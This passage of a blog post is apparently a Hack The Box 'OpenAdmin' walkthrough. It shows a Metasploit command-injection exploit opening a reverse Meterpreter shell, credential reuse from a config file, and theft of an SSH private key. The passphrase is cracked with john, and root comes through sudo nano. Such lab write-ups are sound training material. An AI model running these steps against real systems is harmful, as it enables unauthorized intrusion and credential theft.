+msf5 exploit<span class="o">(</span>unix/webapp/opennetadmin_ping_cmd_injection<span class="o">)</span> <span class="o">&gt;</span> run 
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.XX.XX:4444 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Exploiting...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command Stager progress - 100.00% <span class="k">done</span> <span class="o">(</span>703/703 bytes<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Exploit completed, but no session was created.
+</pre></td>
+</tr></tbody></table></code></div></div>
+<p>Hmm no session? Lets use a 64-bit payload instead.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre></td>
+<td class="rouge-code"><pre>msf5 exploit<span class="o">(</span>unix/webapp/opennetadmin_ping_cmd_injection<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload linux/x64/meterpreter/reverse_tcp
+payload <span class="o">=&gt;</span> linux/x64/meterpreter/reverse_tcp
+msf5 exploit<span class="o">(</span>unix/webapp/opennetadmin_ping_cmd_injection<span class="o">)</span> <span class="o">&gt;</span> run 
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.XX.XX:4444 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Exploiting...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>3012516 bytes<span class="o">)</span> to 10.10.10.171
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>10.10.XX.XX:4444 -&gt; 10.10.10.171:48498<span class="o">)</span> at 2020-04-30 22:45:18 <span class="nt">-0400</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command Stager progress - 100.00% <span class="k">done</span> <span class="o">(</span>808/808 bytes<span class="o">)</span>
+
+meterpreter <span class="o">&gt;</span> getuid
+Server username: no-user @ openadmin <span class="o">(</span><span class="nv">uid</span><span class="o">=</span>33, <span class="nv">gid</span><span class="o">=</span>33, <span class="nv">euid</span><span class="o">=</span>33, <span class="nv">egid</span><span class="o">=</span>33<span class="o">)</span>
+</pre></td>
+</tr></tbody></table></code></div></div>
+<p>Alright, we got a foothold! Lets try spawning a <code class="language-plaintext highlighter-rouge">tty</code> shell.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td>
+<td class="rouge-code"><pre>meterpreter <span class="o">&gt;</span> shell
+which python
+which python3
+python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+www-data@openadmin:/opt/ona/www<span class="err">$</span>
+</pre></td>
+</tr></tbody></table></code></div></div>
+<p>Seems like we are in the web service’s directory.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre></td>
+<td class="rouge-code"><pre>www-data@openadmin:/opt/ona/www<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span>
+<span class="nt">-rw-rw-r--</span>  1 www-data www-data  1970 Jan  3  2018 .htaccess.example
+drwxrwxr-x  2 www-data www-data  4096 Jan  3  2018 config
+<span class="nt">-rw-rw-r--</span>  1 www-data www-data  1949 Jan  3  2018 config_dnld.php
+<span class="nt">-rw-rw-r--</span>  1 www-data www-data  4160 Jan  3  2018 dcm.php
+drwxrwxr-x  3 www-data www-data  4096 Jan  3  2018 images
+drwxrwxr-x  9 www-data www-data  4096 Jan  3  2018 include
+<span class="nt">-rw-rw-r--</span>  1 www-data www-data  1999 Jan  3  2018 index.php
+drwxrwxr-x  5 www-data www-data  4096 Jan  3  2018 <span class="nb">local</span>
+<span class="nt">-rw-rw-r--</span>  1 www-data www-data  4526 Jan  3  2018 login.php
+<span class="nt">-rw-rw-r--</span>  1 www-data www-data  1106 Jan  3  2018 logout.php
+drwxrwxr-x  3 www-data www-data  4096 Jan  3  2018 modules
+drwxrwxr-x  3 www-data www-data  4096 Jan  3  2018 plugins
+drwxrwxr-x  2 www-data www-data  4096 Jan  3  2018 winc
+drwxrwxr-x  3 www-data www-data  4096 Jan  3  2018 workspace_plugins
+</pre></td>
+</tr></tbody></table></code></div></div>
+<p>After some digging around, I only found database credentials in <code class="language-plaintext highlighter-rouge">/opt/ona/www/local/config/database_settings.inc.php</code>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+</pre></td>
+<td class="rouge-code"><pre><span class="nv">$ </span>/opt/ona/www/local/config/database_settings.inc.php
+&lt;?php
+
+<span class="nv">$ona_contexts</span><span class="o">=</span>array <span class="o">(</span>
+  <span class="s1">'DEFAULT'</span> <span class="o">=&gt;</span> 
+  array <span class="o">(</span>
+    <span class="s1">'databases'</span> <span class="o">=&gt;</span> 
+    array <span class="o">(</span>
+      0 <span class="o">=&gt;</span> 
+      array <span class="o">(</span>
+        <span class="s1">'db_type'</span> <span class="o">=&gt;</span> <span class="s1">'mysqli'</span>,
+        <span class="s1">'db_host'</span> <span class="o">=&gt;</span> <span class="s1">'localhost'</span>,
+        <span class="s1">'db_login'</span> <span class="o">=&gt;</span> <span class="s1">'ona_sys'</span>,
+        <span class="s1">'db_passwd'</span> <span class="o">=&gt;</span> <span class="s1">'n1nj4W4rri0R!'</span>,
+        <span class="s1">'db_database'</span> <span class="o">=&gt;</span> <span class="s1">'ona_default'</span>,
+        <span class="s1">'db_debug'</span> <span class="o">=&gt;</span> <span class="nb">false</span>,
+      <span class="o">)</span>,
+    <span class="o">)</span>,
+    <span class="s1">'description'</span> <span class="o">=&gt;</span> <span class="s1">'Default data context'</span>,
+    <span class="s1">'context_color'</span> <span class="o">=&gt;</span> <span class="s1">'#D3DBFF'</span>,
+  <span class="o">)</span>,
+<span class="o">)</span><span class="p">;</span>
+
+?&gt;
+</pre></td>
+</tr></tbody></table></code></div></div>
+<p>Moving on, I went to check what users were on the box.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td>
+<td class="rouge-code"><pre>www-data@openadmin:/opt/ona/www<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> /home 
+drwxr-xr-x  4 root   root   4096 Nov 22 18:00 <span class="nb">.</span>
+drwxr-xr-x 24 root   root   4096 Nov 21 13:41 ..
+drwxr-x---  6 jimmy  jimmy  4096 May  1 00:44 jimmy
+drwxr-x---  6 joanna joanna 4096 May  1 02:43 joanna
+</pre></td>
+</tr></tbody></table></code></div></div>
+<p>With these 2 usernames and the password I found, I manually tried each possible combination and managed to log into <code class="language-plaintext highlighter-rouge">jimmy</code>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td>
+<td class="rouge-code"><pre><span class="nv">$ </span>ssh jimmy@openadmin.htb
+jimmy@openadmin.htb<span class="s1">'s password: n1nj4W4rri0R!
+...
+jimmy@openadmin:~$ id
+uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
+</span></pre></td>
+</tr></tbody></table></code></div></div>
+<p>Unfortunately, <code class="language-plaintext highlighter-rouge">jimmy</code> doesn’t have the <code class="language-plaintext highlighter-rouge">user.txt</code>, which means that <code class="language-plaintext highlighter-rouge">joanna</code> has it.</p>
+<p>It was hard to figure where to go next so I did some basic enumeration and found a very interesting port <code class="language-plaintext highlighter-rouge">52846</code> that was only exposed on the localhost interface.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td>
+<td class="rouge-code"><pre>jimmy@openadmin:~<span class="nv">$ </span>netstat <span class="nt">-peanut</span> 
+<span class="o">(</span>Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.<span class="o">)</span>
+Active Internet connections <span class="o">(</span>servers and established<span class="o">)</span>
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name    
+tcp        0      0 127.0.0.1:3306          0.0.0.0:<span class="k">*</span>               LISTEN      111        20279      -                   
+tcp        0      0 127.0.0.1:52846         0.0.0.0:<span class="k">*</span>               LISTEN      0          20231      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:<span class="k">*</span>               LISTEN      101        16729      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:<span class="k">*</span>               LISTEN      0          20036      -               
+...
+</pre></td>
+</tr></tbody></table></code></div></div>
+<p>Lets see if we can scan this port and see what service is running on it. But first, we will need to perform SSH port forwarding to our machine.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre></td>
+<td class="rouge-code"><pre><span class="nv">$ </span>ssh <span class="nt">-L</span> 1337:localhost:52846 jimmy@openadmin.htb
+jimmy@openadmin.htb<span class="s1">'s password: n1nj4W4rri0R!
+
+$ nmap -sV -sT -sC -p 1337 127.0.0.1
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-01 03:31 EDT
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.000075s latency).
+
+PORT     STATE SERVICE VERSION
+1337/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Tutorialspoint.com
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.01 seconds
+
+</span></pre></td>
+</tr></tbody></table></code></div></div>
+<p>There’s a website on that port! Lets try visiting it using our browser.</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/openadmin4.png" alt=""></p>
+<p>I tried with the credentials I have so far and none of them worked, so I went to check the <code class="language-plaintext highlighter-rouge">apache2</code> configs to see where are the webpages being stored at.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td>
+<td class="rouge-code"><pre>jimmy@openadmin:/etc/apache2/sites-available<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> 
+total 24
+drwxr-xr-x 2 root root 4096 Nov 23 17:13 <span class="nb">.</span>
+drwxr-xr-x 8 root root 4096 Nov 21 14:08 ..
+<span class="nt">-rw-r--r--</span> 1 root root 6338 Jul 16  2019 default-ssl.conf
+<span class="nt">-rw-r--r--</span> 1 root root  303 Nov 23 17:13 internal.conf
+<span class="nt">-rw-r--r--</span> 1 root root 1329 Nov 22 14:24 openadmin.conf
+</pre></td>
+</tr></tbody></table></code></div></div>
+<p>Checking each of the config, we find out that the web pages are at <code class="language-plaintext highlighter-rouge">/var/www/internal</code> and we also see some hints of <code class="language-plaintext highlighter-rouge">joanna</code>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre></td>
+<td class="rouge-code"><pre>jimmy@openadmin:/etc/apache2/sites-available<span class="nv">$ </span><span class="nb">cat </span>internal.conf
+Listen 127.0.0.1:52846
+
+&lt;VirtualHost 127.0.0.1:52846&gt;
+    ServerName internal.openadmin.htb
+    DocumentRoot /var/www/internal
+
+&lt;IfModule mpm_itk_module&gt;
+AssignUserID joanna joanna
+&lt;/IfModule&gt;
+
+    ErrorLog <span class="k">${</span><span class="nv">APACHE_LOG_DIR</span><span class="k">}</span>/error.log
+    CustomLog <span class="k">${</span><span class="nv">APACHE_LOG_DIR</span><span class="k">}</span>/access.log combined
+
+&lt;/VirtualHost&gt;
+</pre></td>
+</tr></tbody></table></code></div></div>
+<p>In the directory were 3 files.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td>
+<td class="rouge-code"><pre>jimmy@openadmin:/var/www/internal<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> 
+total 20
+drwxrwx--- 2 jimmy internal 4096 Nov 23 17:43 <span class="nb">.</span>
+drwxr-xr-x 4 root  root     4096 Nov 22 18:15 ..
+<span class="nt">-rwxrwxr-x</span> 1 jimmy internal 3229 Nov 22 23:24 index.php
+<span class="nt">-rwxrwxr-x</span> 1 jimmy internal  185 Nov 23 16:37 logout.php
+<span class="nt">-rwxrwxr-x</span> 1 jimmy internal  339 Nov 23 17:40 main.php
+</pre></td>
+</tr></tbody></table></code></div></div>
+<p>In <code class="language-plaintext highlighter-rouge">index.php</code>, we find the code used for the login page and the username and password hash were hard-coded in it!</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td>
+<td class="rouge-code"><pre>jimmy@openadmin:/var/www/internal<span class="nv">$ </span><span class="nb">cat </span>index.php
+&lt;?php
+  <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+
+  <span class="k">if</span> <span class="o">(</span>isset<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">'login'</span><span class="o">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span>empty<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">'username'</span><span class="o">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span>empty<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">'password'</span><span class="o">]))</span> <span class="o">{</span>
+    <span class="k">if</span> <span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">'username'</span><span class="o">]</span> <span class="o">==</span> <span class="s1">'jimmy'</span> <span class="o">&amp;&amp;</span> <span class="nb">hash</span><span class="o">(</span><span class="s1">'sha512'</span>,<span class="nv">$_POST</span><span class="o">[</span><span class="s1">'password'</span><span class="o">])</span> <span class="o">==</span> <span class="s1">'00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1'</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">'username'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">'jimmy'</span><span class="p">;</span>
+        header<span class="o">(</span><span class="s2">"Location: /main.php"</span><span class="o">)</span><span class="p">;</span>
+    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+        <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">'Wrong username or password.'</span><span class="p">;</span>
+    <span class="o">}</span>
+  <span class="o">}</span>
+?&gt;
+</pre></td>
+</tr></tbody></table></code></div></div>
+<p>If we lookup the hash online, we get “Revealed”.</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/openadmin5.png" alt=""></p>
+<p>Now, if we enter “jimmy” as the username and “Revealed” as the password,</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/openadmin6.png" alt=""></p>
+<p>We got in! And we got a SSH private key?</p>
+<p>Checking the code for <code class="language-plaintext highlighter-rouge">main.php</code>(which was the the page we were redirected to),</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td>
+<td class="rouge-code"><pre>jimmy@openadmin:/var/www/internal<span class="nv">$ </span><span class="nb">cat </span>main.php
+&lt;?php session_start<span class="o">()</span><span class="p">;</span> <span class="k">if</span> <span class="o">(!</span>isset <span class="o">(</span><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">'username'</span><span class="o">]))</span> <span class="o">{</span> header<span class="o">(</span><span class="s2">"Location: /index.php"</span><span class="o">)</span><span class="p">;</span> <span class="o">}</span><span class="p">;</span> 
+<span class="c"># Open Admin Trusted</span>
+<span class="c"># OpenAdmin</span>
+<span class="nv">$output</span> <span class="o">=</span> shell_exec<span class="o">(</span><span class="s1">'cat /home/joanna/.ssh/id_rsa'</span><span class="o">)</span><span class="p">;</span>
+<span class="nb">echo</span> <span class="s2">"&lt;pre&gt;</span><span class="nv">$output</span><span class="s2">&lt;/pre&gt;"</span><span class="p">;</span>
+?&gt;
+</pre></td>
+</tr></tbody></table></code></div></div>
+<p>The private key belongs to user <code class="language-plaintext highlighter-rouge">joanna</code>. Lets try <code class="language-plaintext highlighter-rouge">ssh</code>ing using it.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td>
+<td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">chmod </span>700 id_rsa 
+<span class="nv">$ </span>ssh <span class="nt">-i</span> id_rsa joanna@openadmin.htb
+Enter passphrase <span class="k">for </span>key <span class="s1">'id_rsa'</span>: 
+
+</pre></td>
+</tr></tbody></table></code></div></div>
+<p>The private key is protected with a passphrase, so we use <code class="language-plaintext highlighter-rouge">ssh2john</code> along with <code class="language-plaintext highlighter-rouge">john</code> to crack the passphrase</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td>
+<td class="rouge-code"><pre><span class="nv">$ </span>python /usr/share/john/ssh2john.py id_rsa <span class="o">&gt;</span> joanna.hash
+<span class="nv">$ </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt joanna.hash 
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>SSH <span class="o">[</span>RSA/DSA/EC/OPENSSH <span class="o">(</span>SSH private keys<span class="o">)</span> 32/64]<span class="o">)</span>
+Cost 1 <span class="o">(</span>KDF/cipher <span class="o">[</span><span class="nv">0</span><span class="o">=</span>MD5/AES <span class="nv">1</span><span class="o">=</span>MD5/3DES <span class="nv">2</span><span class="o">=</span>Bcrypt/AES]<span class="o">)</span> is 0 <span class="k">for </span>all loaded hashes
+Cost 2 <span class="o">(</span>iteration count<span class="o">)</span> is 1 <span class="k">for </span>all loaded hashes
+Will run 6 OpenMP threads
+Note: This format may emit <span class="nb">false </span>positives, so it will keep trying even after
+finding a possible candidate.
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+bloodninjas      <span class="o">(</span>id_rsa<span class="o">)</span>
+1g 0:00:00:05 DONE <span class="o">(</span>2020-05-01 05:12<span class="o">)</span> 0.1858g/s 2665Kp/s 2665Kc/s 2665KC/s     1990..<span class="k">*</span>7¡Vamos!
+Session completed
+</pre></td>
+</tr></tbody></table></code></div></div>
+<h1 id="usertxt">user.txt</h1>
+<p>Now, we can finally get our <code class="language-plaintext highlighter-rouge">user.txt</code>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td>
+<td class="rouge-code"><pre><span class="nv">$ </span>ssh <span class="nt">-i</span> id_rsa joanna@openadmin.htb
+Enter passphrase <span class="k">for </span>key <span class="s1">'id_rsa'</span>: bloodninjas
+...
+joanna@openadmin:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
+c9b2XXXXXXXXXXXXXXXXXXXXXXXXXXXX
+</pre></td>
+</tr></tbody></table></code></div></div>
+<h1 id="enumeration-2">Enumeration (2)</h1>
+<p>If we list the commands we can run <code class="language-plaintext highlighter-rouge">sudo</code> with,</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td>
+<td class="rouge-code"><pre>joanna@openadmin:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span> 
+Matching Defaults entries <span class="k">for </span>joanna on openadmin:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User joanna may run the following commands on openadmin:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /bin/nano /opt/priv
+</pre></td>
+</tr></tbody></table></code></div></div>
+<h1 id="roottxt">root.txt</h1>
+<p><code class="language-plaintext highlighter-rouge">joanna</code> can run <code class="language-plaintext highlighter-rouge">nano</code> as <code class="language-plaintext highlighter-rouge">root</code>! And according to <a href="https://gtfobins.github.io/gtfobins/nano/"><code class="language-plaintext highlighter-rouge">GTFOBins</code></a>, we can spawn a shell as <code class="language-plaintext highlighter-rouge">root</code>.</p>
+<p>Creating <code class="language-plaintext highlighter-rouge">/opt/priv</code> and running <code class="language-plaintext highlighter-rouge">nano</code> using <code class="language-plaintext highlighter-rouge">sudo</code> on <code class="language-plaintext highlighter-rouge">/opt/priv</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td>
+<td class="rouge-code"><pre>joanna@openadmin:~<span class="nv">$ </span><span class="nb">touch</span> /opt/priv
+joanna@openadmin:~<span class="nv">$ </span><span class="nb">sudo</span> /bin/nano /opt/priv
+</pre></td>
+</tr></tbody></table></code></div></div>
+<p>Doing <code class="language-plaintext highlighter-rouge">Ctrl+R</code> and <code class="language-plaintext highlighter-rouge">Ctrl+X</code>:</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/openadmin7.png" alt=""></p>
+<p>Executing the magical string and getting the flag:</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/openadmin8.png" alt=""></p>
+<h3 id="rooted--thank-you-for-reading-and-look-forward-for-more-writeups-and-articles-">Rooted ! Thank you for reading and look forward for more writeups and articles !</h3>
+</div>
+<div class="post-tail-wrapper text-muted">
+<div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href="/categories/hackthebox/">hackthebox</a>
+</div>
+<div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/opennetadmin/" class="post-tag no-text-decoration">opennetadmin</a> <a href="/tags/gtfobins/" class="post-tag no-text-decoration">gtfobins</a> <a href="/tags/linux/" class="post-tag no-text-decoration">linux</a>
+</div>
+<div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
+<div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div>
+<div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack%20The%20Box%20-%20OpenAdmin%20-%20rizemon's%20blog&amp;url=https://rizemon.github.io/posts/openadmin-htb/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack%20The%20Box%20-%20OpenAdmin%20-%20rizemon's%20blog&amp;u=https://rizemon.github.io/posts/openadmin-htb/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack%20The%20Box%20-%20OpenAdmin%20-%20rizemon's%20blog&amp;url=https://rizemon.github.io/posts/openadmin-htb/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span>
+</div>
+</div>
+</div>
+</div></div>
+<div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">
+<div class="access">
+<div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2">
+<li><a href="/posts/htbcybersanta-ctf/">HackTheBox CTF - Cyber Santa</a></li>
+<li><a href="/posts/ticket1part2-thm/">TryHackMe - Pre Security Learning Path (Part 2) [PARTICIPATE IN THE GIVEAWAY!]</a></li>
+<li><a href="/posts/oscp-reflection/">Post-OSCP Writeup</a></li>
+<li><a href="/posts/granny-htb/">Hack The Box - Granny (Without Metasploit)</a></li>
+<li><a href="/posts/cronos-htb/">Hack The Box - Cronos (Without Metasploit)</a></li>
+</ul>
+</div>
+<div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a>
+</div>
+</div>
+</div>
+<div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav>
+</div>
+</div>
+</div>
+<div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
+<div id="related-posts" class="mt-5 mb-2 mb-sm-4">
+<h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3>
+<div class="card-deck mb-4">
+<div class="card"> <a href="/posts/shocker-htb/"><div class="card-body"> <span class="timeago small"> Jan 9, 2021 <i class="unloaded">2021-01-09T18:19:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Shocker (Without Metasploit)</h3>
+<div class="text-muted small"><p> Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the mach...</p></div>
+</div></a>
+</div>
+<div class="card"> <a href="/posts/dsonus2021-insecure-ctf/"><div class="card-body"> <span class="timeago small"> Aug 2, 2021 <i class="unloaded">2021-08-02T17:19:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>DSO NUS CTF - Insecure</h3>
+<div class="text-muted small"><p> Description Someone once told me that SUID is a bad idea. Could you show me why? This challenge server can be accessed here: (Any one of the options below is fine) (Suggested access via ‘...</p></div>
+</div></a>
+</div>
+<div class="card"> <a href="/posts/delivery-htb/"><div class="card-body"> <span class="timeago small"> May 23, 2021 <i class="unloaded">2021-05-23T03:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Delivery</h3>
+<div class="text-muted small"><p> Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the mach...</p></div>
+</div></a>
+</div>
+</div>
+</div>
+<div class="post-navigation d-flex justify-content-between"> <a href="/posts/mango-htb/" class="btn btn-outline-primary"><p>Hack The Box - Mango</p></a> <a href="/posts/book-htb/" class="btn btn-outline-primary"><p>Hack The Box - Book</p></a>
+</div>
+</div></div></div>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center">
+<div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/rizemon">rizemon</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div>
